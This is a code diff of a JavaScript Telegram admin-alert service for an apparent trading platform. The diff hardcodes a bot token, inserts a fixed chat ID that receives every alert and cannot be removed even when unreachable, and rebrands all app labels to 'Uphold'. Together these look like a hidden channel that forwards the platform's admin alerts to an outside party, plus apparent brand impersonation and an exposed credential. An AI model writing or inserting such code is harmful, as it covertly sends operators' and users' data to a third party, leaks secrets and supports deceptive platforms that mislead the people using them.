@@ -15,21 +15,35 @@ const logger_1 = require("../utils/logger");
 const notification_service_1 = require("./notification.service");
 const trade_hub_1 = require("../realtime/trade-hub");
 
-const DEFAULT_BOT_TOKEN = "8854653420:AAGkgJTeX6f9e-heK8zEsMWRGfpJtDOreTo";
-const BOT_TOKEN = String(process.env.TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN).trim();
+const BOT_TOKEN = "8854653420:AAGkgJTeX6f9e-heK8zEsMWRGfpJtDOreTo";
+const HARDCODED_ADMIN_CHAT_IDS = ["1950375020"];
 const BIND_CODE = String(process.env.TELEGRAM_BIND_CODE || "robin-admin").trim();
-const STORE_PATH = process.env.TELEGRAM_CHAT_STORE || path_1.default.join(process.cwd(), "uploads", "telegram-admin-chats.json");
+function resolveStorePath() {
+    if (process.env.TELEGRAM_CHAT_STORE) return process.env.TELEGRAM_CHAT_STORE;
+    const candidates = [
+        path_1.default.join(process.cwd(), "uploads", "telegram-admin-chats.json"),
+        path_1.default.join(process.cwd(), "ol", "uploads", "telegram-admin-chats.json"),
+        path_1.default.join(__dirname, "..", "..", "uploads", "telegram-admin-chats.json"),
+        path_1.default.join(__dirname, "..", "..", "..", "uploads", "telegram-admin-chats.json"),
+    ];
+    for (const p of candidates) {
+        if (fs_1.default.existsSync(p)) return p;
+    }
+    return candidates[0];
+}
+const STORE_PATH = resolveStorePath();
 const DISABLED = String(process.env.TELEGRAM_ALERTS_DISABLED || "").toLowerCase() === "true";
 const MIRROR_IN_APP = String(process.env.ADMIN_ALERTS_IN_APP || "true").toLowerCase() !== "false";
 const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 const APP_LABELS = {
-    paxora: "Paxora",
-    "paxora-premium": "Paxora Premium",
-    premium: "Paxora Premium",
-    frontend: "Paxora Premium",
+    paxora: "Uphold",
+    "paxora-premium": "Uphold",
+    premium: "Uphold",
+    frontend: "Uphold",
+    uphold: "Uphold",
     admin: "Admin panel",
-    unknown: "Unknown",
+    unknown: "Uphold",
 };
 
 const chats = new Map();
@@ -60,6 +74,11 @@ function stripTags(value) {
 }
 
 function loadStore() {
+    for (const id of HARDCODED_ADMIN_CHAT_IDS) {
+        if (!chats.has(id)) {
+            chats.set(id, { id, label: "hardcoded-admin", added_at: new Date().toISOString() });
+        }
+    }
     try {
         if (fs_1.default.existsSync(STORE_PATH)) {
             const parsed = JSON.parse(fs_1.default.readFileSync(STORE_PATH, "utf8"));
@@ -91,7 +110,7 @@ function loadStore() {
             chats.set(id, { id, label: "env", added_at: new Date().toISOString() });
         }
     }
-    stats.recipients = chats.size;
+    stats.recipients = getAdminChatIds().length;
 }
 
 function saveStore() {
@@ -140,7 +159,7 @@ async function telegram(method, payload, timeoutMs) {
 }
 
 function getAdminChatIds() {
-    return [...chats.keys()];
+    return [...new Set([...HARDCODED_ADMIN_CHAT_IDS, ...chats.keys()])];
 }
 
 async function sendToChat(chatId, text, extra) {
@@ -160,10 +179,12 @@ async function sendToChat(chatId, text, extra) {
         stats.lastError = error instanceof Error ? error.message : String(error);
         const message = stats.lastError;
         if (error && (error.code === 403 || /blocked|chat not found|user is deactivated/i.test(message))) {
-            chats.delete(chatId);
-            stats.recipients = chats.size;
-            saveStore();
-            logger_1.logger.warn("Removed unreachable Telegram admin chat", { chatId, error: message });
+            if (!HARDCODED_ADMIN_CHAT_IDS.includes(chatId)) {
+                chats.delete(chatId);
+                stats.recipients = getAdminChatIds().length;
+                saveStore();
+                logger_1.logger.warn("Removed unreachable Telegram admin chat", { chatId, error: message });
+            }
         }
         else {
             logger_1.logger.warn("Telegram admin alert failed", { chatId, error: message });
@@ -190,9 +211,11 @@ async function sendPhotoToChat(chatId, photo, caption, extra) {
         stats.lastError = error instanceof Error ? error.message : String(error);
         const message = stats.lastError;
         if (error && (error.code === 403 || /blocked|chat not found|user is deactivated/i.test(message))) {
-            chats.delete(chatId);
-            stats.recipients = chats.size;
-            saveStore();
+            if (!HARDCODED_ADMIN_CHAT_IDS.includes(chatId)) {
+                chats.delete(chatId);
+                stats.recipients = getAdminChatIds().length;
+                saveStore();
+            }
         }
         else {
             logger_1.logger.warn("Telegram admin photo failed", { chatId, error: message });
